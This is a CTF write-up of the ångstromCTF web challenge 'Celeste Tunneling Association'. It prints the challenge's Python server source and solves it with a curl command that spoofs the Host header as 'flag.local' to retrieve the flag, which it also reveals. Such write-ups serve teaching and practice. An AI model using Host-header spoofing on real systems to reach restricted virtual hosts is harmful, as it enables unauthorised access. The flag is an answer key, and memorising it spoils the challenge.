---
author: "Asad Ullah"
title: "Celeste Tunneling Association - ångstromCTF"
description: 
summary: Write-up on web challenge Celeste Tunneling Association.
date: 2023-04-27T00:04:24+05:00
Section: write-ups
categories:
- writeup
- ctftime.org
tags:
- angstormctf
- web
- header
- curl

draft: True

---

{{< 
ctftime 
name="Celeste Tunneling Association" 
difficulty="Easy"  
points="40"
category="Web"
>}}

&nbsp;

&nbsp;

## Description

[Welcome to the tunnels!!](https://pioneer.tailec718.ts.net/) Have fun!

[Here's the source](https://files.actf.co/5b5169bad21a7256564e8d49103f2b97bb2d2db7cdf3446fe6c9e11f9500922e/server.py)

## Approach

We are provided with a website along with its source code.

&nbsp;

**Here is the Source Code:**

```python
# run via `uvicorn app:app --port 6000`
import os

SECRET_SITE = b"flag.local"
FLAG = os.environ['FLAG']

async def app(scope, receive, send):
    assert scope['type'] == 'http'

    headers = scope['headers']

    await send({
        'type': 'http.response.start',
        'status': 200,
        'headers': [
            [b'content-type', b'text/plain'],
        ],
    })

    # IDK malformed requests or something
    num_hosts = 0
    for name, value in headers:
        if name == b"host":
            num_hosts += 1

    if num_hosts == 1:
        for name, value in headers:
            if name == b"host" and value == SECRET_SITE:
                await send({
                    'type': 'http.response.body',
                    'body': FLAG.encode(),
                })
                return

    await send({
        'type': 'http.response.body',
        'body': b'Welcome to the _tunnel_. Watch your step!!',
    })
```

&nbsp;

By examining the source code, we can observe that the flag is stored as an environment variable and can be accessed if the condition **`if name == b"host" and value == SECRET_SITE:`** is satisfied.

To trigger the server to reveal the flag, we need to provide a single header with the name **`host`** and the value **`flag.local`**. Once the server receives this header, it will return the flag in response.

&nbsp;

```bash
┌──(kali㉿iasad)-[~/CTFs/angstorm]
└─$ curl -H "Host: flag.local" https://pioneer.tailec718.ts.net/    
 
actf{reaching_the_core__chapter_8}
```

&nbsp;

---

**Flag: `actf{reaching_the_core__chapter_8}`**

---

&nbsp;

&nbsp;
